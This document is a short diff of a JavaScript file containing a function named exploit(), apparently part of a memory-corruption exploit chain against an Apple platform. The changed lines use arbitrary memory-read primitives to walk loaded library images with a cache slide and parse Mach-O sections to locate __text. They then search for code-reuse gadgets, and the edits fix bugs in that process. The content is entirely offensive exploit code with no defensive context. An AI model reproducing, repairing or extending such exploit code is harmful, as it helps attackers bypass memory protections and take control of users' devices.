@@ -651,7 +651,7 @@ function exploit(){
             {
                 return memory.copyfrom(Add(straddr, i),0,1)[0];
             };
-            var base = Add(memory.read_i64(Add(imgs, i * 0x20)),cache_slide);
+            var base = Add(memory.read_i32(Add(imgs, i * 0x20)),cache_slide);
             log(base)
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
@@ -664,7 +664,7 @@ function exploit(){
                         var nsects = memory.u32(Add(base, off + 0x40));
                         for(var k = 0, o = off + 0x48; k < nsects; ++k)
                         {
-                            if(strcmp(memory.copyfrom(Add(base, o), 0x10), "__text"))
+                            if(strcmp(memory.copyfrom(Add(base, o),0, 0x10), "__text"))
                             {
                                 log("made it?")
                                 var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])
